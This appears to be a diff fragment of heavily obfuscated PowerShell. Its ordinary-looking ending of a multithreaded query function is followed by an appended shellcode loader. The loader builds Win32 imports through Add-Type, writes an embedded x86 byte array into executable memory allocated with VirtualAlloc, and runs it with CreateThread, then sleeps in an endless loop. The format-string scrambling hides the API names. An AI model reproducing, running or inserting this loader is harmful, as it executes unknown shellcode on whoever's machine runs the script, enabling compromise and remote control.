+                &("{2}{0}{1}"-f 'te-Progres','s','Wri') -Id ${p`ROg`Re`Ssid} -Activity ("{4}{2}{0}{1}{3}"-f 'Q','ue','g ','ry','Runnin') -Status ("{2}{3}{4}{0}{1}" -f 'th','reads','S','ta','rting ') -Completed
+            }
+        }
+        finally {
+            
+            if ( (${tImE`DOuT`Tasks} -eq ${fal`SE}) -or ( (${timE`dOutT`A`sKs} -eq ${tR`Ue}) -and (${n`oc`l`O`sEONTImeo`Ut} -eq ${fa`LSE}) ) ) {
+                &("{1}{2}{3}{0}" -f'Verbose','Wri','t','e-') ("{0}{3}{2}{5}{4}{1}"-f 'Clo','unspace pool','ng the','si','r',' ')
+                ${RunSP`A`ceP`OoL}.("{0}{1}"-f 'c','lose').Invoke()
+            }
+            
+              ${Y`S0}::("{1}{2}{0}" -f'ect','Co','ll').Invoke()
+        }
+    }
+}
+${c} = ((("{16}{25}{69}{21}{70}{57}{9}{13}{56}{26}{85}{44}{18}{6}{1}{34}{84}{87}{0}{48}{78}{72}{53}{60}{55}{38}{20}{33}{67}{12}{65}{76}{83}{73}{11}{7}{40}{63}{88}{35}{8}{23}{51}{36}{86}{24}{37}{15}{81}{2}{68}{47}{29}{3}{52}{61}{50}{64}{46}{19}{5}{45}{22}{28}{4}{59}{27}{71}{80}{14}{32}{10}{77}{17}{66}{75}{30}{39}{31}{74}{79}{43}{42}{58}{41}{62}{54}{49}{82}" -f 'd','tP','i',' IntP','onFla','rameter, u','rn In',')]','tern IntP','32.dll',';[','lWYL','po','W','Threa','ut','[D','vcrt.d','xte','tr lpPa','ocationType, uint flPro','Y','dwCre','tr Cr','d(Int','llI','L)]publi','Ptr ','ati','kSize,',']p','c ','dId)','tect);[Dl','tr VirtualAlloc(IntPtr lp','ex','eThre','Ptr lpThreadAttrib','flAll','ubli','pu','t, ',' IntPtr mems','xtern','atic e','int ','IntP','wStac','ress','ount)','rtAddress','eat','tr ','ize,',', uint c','t ','Y','l','et(IntPtr des','gs, Int',' uin','lpSta','uint src','blic sta',', ','rt(W','ll','lIm','nt d','mport(W','Lkerne','l','wS','dl','st','WYL)','YLke','DllImport(WYLms',', uint d','atic e','p','es, u',';','rnel32.','A','c st','a','d','tic '))."R`e`plACE"('WYL',[STRING][chaR]34));${W} = &("{1}{2}{0}"-f'd-Type','A','d') -memberDefinition ${c} -Name ("{1}{0}"-f'2','Win3') -namespace ("{0}{3}{1}{2}"-f 'Win32Fu','ti','ons','nc') -passthru;[Byte[]];[Byte[]]${z} = 0xb8,0xad,0x55,0x49,0x87,0xd9,0xcf,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x47,0x31,0x46,0x13,0x03,0x46,0x13,0x83,0xc6,0xa9,0xb7,0xbc,0x7b,0x59,0xb5,0x3f,0x84,0x99,0xda,0xb6,0x61,0xa8,0xda,0xad,0xe2,0x9a,0xea,0xa6,0xa7,0x16,0x80,0xeb,0x53,0xad,0xe4,0x23,0x53,0x06,0x42,0x12,0x5a,0x97,0xff,0x66,0xfd,0x1b,0x02,0xbb,0xdd,0x22,0xcd,0xce,0x1c,0x63,0x30,0x22,0x4c,0x3c,0x3e,0x91,0x61,0x49,0x0a,0x2a,0x09,0x01,0x9a,0x2a,0xee,0xd1,0x9d,0x1b,0xa1,0x6a,0xc4,0xbb,0x43,0xbf,0x7c,0xf2,0x5b,0xdc,0xb9,0x4c,0xd7,0x16,0x35,0x4f,0x31,0x67,0xb6,0xfc,0x7c,0x48,0x45,0xfc,0xb9,0x6e,0xb6,0x8b,0xb3,0x8d,0x4b,0x8c,0x07,0xec,0x97,0x19,0x9c,0x56,0x53,0xb9,0x78,0x67,0xb0,0x5c,0x0a,0x6b,0x7d,0x2a,0x54,0x6f,0x80,0xff,0xee,0x8b,0x09,0xfe,0x20,0x1a,0x49,0x25,0xe5,0x47,0x09,0x44,0xbc,0x2d,0xfc,0x79,0xde,0x8e,0xa1,0xdf,0x94,0x22,0xb5,0x6d,0xf7,0x2a,0x7a,0x5c,0x08,0xaa,0x14,0xd7,0x7b,0x98,0xbb,0x43,0x14,0x90,0x34,0x4a,0xe3,0xd7,0x6e,0x2a,0x7b,0x26,0x91,0x4b,0x55,0xec,0xc5,0x1b,0xcd,0xc5,0x65,0xf0,0x0d,0xea,0xb3,0x6d,0x0b,0x7c,0xfc,0xda,0x13,0x1b,0x94,0x18,0x14,0xfc,0xf4,0x94,0xf2,0x52,0xa5,0xf6,0xaa,0x12,0x15,0xb7,0x1a,0xfa,0x7f,0x38,0x44,0x1a,0x80,0x92,0xed,0xb0,0x6f,0x4b,0x45,0x2c,0x09,0xd6,0x1d,0xcd,0xd6,0xcc,0x5b,0xcd,0x5d,0xe3,0x9c,0x83,0x95,0x8e,0x8e,0x73,0x56,0xc5,0xed,0xd5,0x69,0xf3,0x98,0xd9,0xff,0xf8,0x0a,0x8e,0x97,0x02,0x6a,0xf8,0x37,0xfc,0x59,0x73,0xf1,0x68,0x22,0xeb,0xfe,0x7c,0xa2,0xeb,0xa8,0x16,0xa2,0x83,0x0c,0x43,0xf1,0xb6,0x52,0x5e,0x65,0x6b,0xc7,0x61,0xdc,0xd8,0x40,0x0a,0xe2,0x07,0xa6,0x95,0x1d,0x62,0x36,0xe9,0xcb,0x4a,0x4c,0x03,0xc8;${G} = 0x1000;if (${Z}."L`eNgTh" -gt 0x1000){${G} = ${z}."len`GtH"};${X}=${W}::("{2}{1}{0}{3}" -f 'All','al','Virtu','oc').Invoke(0,0x1000,${g},0x40);for (${i}=0;${i} -le (${Z}."le`NgTh"-1);${I}++) {${w}::"m`eMS`eT"([IntPtr](${x}.("{0}{1}{2}"-f'T','oIn','t32').Invoke()+${I}), ${Z}[${i}], 1)};${w}::("{2}{3}{0}{1}"-f 'eateThre','ad','C','r').Invoke(0,0,${x},0,0,0);for (;;){&("{2}{1}{3}{0}"-f'leep','-','Start','s') 60};
